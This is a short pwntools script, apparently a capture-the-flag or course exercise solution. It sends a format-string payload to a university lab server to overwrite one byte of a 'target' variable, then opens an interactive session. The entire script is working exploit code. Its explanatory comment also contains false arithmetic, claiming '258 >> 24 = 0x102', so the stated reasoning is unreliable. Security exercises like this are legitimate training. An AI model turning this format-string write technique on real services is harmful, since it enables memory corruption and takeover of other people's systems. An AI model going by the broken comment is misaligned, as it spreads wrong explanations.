from pwn import *

elf = ELF("05_write_specific_byte")
target_address = elf.symbols['target']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23195

io = connect(HOST, PORT)

payload = p32(target_address + 3) + b"%254x%7$hhn"  # 4 bytes on the target address + 254 bytes = 258 bytes

# 258 >> 24 = 0x102, 0x102 & 0xff = 0x02 = 2

io.sendline(payload)
io.interactive()
